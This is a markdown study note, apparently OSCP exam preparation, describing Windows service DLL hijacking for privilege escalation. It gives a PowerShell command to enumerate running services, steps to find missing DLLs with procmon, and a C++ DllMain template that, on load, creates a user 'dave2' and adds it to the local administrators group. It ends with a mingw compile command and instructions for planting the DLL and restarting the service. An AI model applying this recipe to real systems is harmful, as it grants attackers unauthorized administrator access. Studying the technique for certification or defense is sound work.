# Service DLL Hijacking

## Safe DLL Search Order
this is how windows loads its DLLs whaen an executable is run.
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

## Identifying the service

1. use the following command to get services running: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

2. look for binaries that are user installed, not in a usual location like `C:\windows\...`

3. see if you have full access to the binary as a user, if you do try follow `Windows_service_binary_hijacking.md`, if not follow on

4. use procmon as a high level user to see loaded DLLs by the program. set a filter like bellow to only show that process.
   ![image](https://github.com/M-1-7-7/OSCP_2023_notes/assets/108218328/dcf38ab3-651b-459a-a728-c044476de1ce)

5. restart the service as look at the loded DLLs, are ther any missing or loaded out of the `Safe DLL Search Order` order where we could inject a custom DLL.

6. Use this C++ template to create a dll that will add a user to the admin group: (ensure to put the code in the correct secction of program)
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

7. use `x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll`on kali to generate the DLL

8. get it onto the target system and into the required location

9. restart the service and chech the admin group: `Restart-Service BetaService` `net user`

   
